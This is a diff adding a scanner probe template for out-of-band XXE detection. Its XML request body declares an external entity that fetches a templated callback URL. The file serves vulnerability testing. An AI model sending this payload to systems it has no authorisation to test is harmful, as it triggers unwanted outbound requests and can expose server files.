@@ -1,0 +1,20 @@
+id: "OAST-XXE-CALLBACK"
+name: "OAST XXE external entity callback probe"
+tech_stack: []
+severity: high
+cvss: 7.1
+payload: "{{callback_url}}"
+risk_level: intrusive
+requires_confirmation: true
+injection_points: [Body]
+request_method: POST
+request_headers:
+  Content-Type: "application/xml"
+request_body: "<?xml version=\"1.0\"?><!DOCTYPE temu [<!ENTITY xxe SYSTEM \"{{payload}}\">]><temu>&xxe;</temu>"
+verify:
+  match_type: StatusCode
+  response_codes: [599]
+cve_id: null
+remediation: "Disable external entity resolution and DTD processing in XML parsers."
+references:
+  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
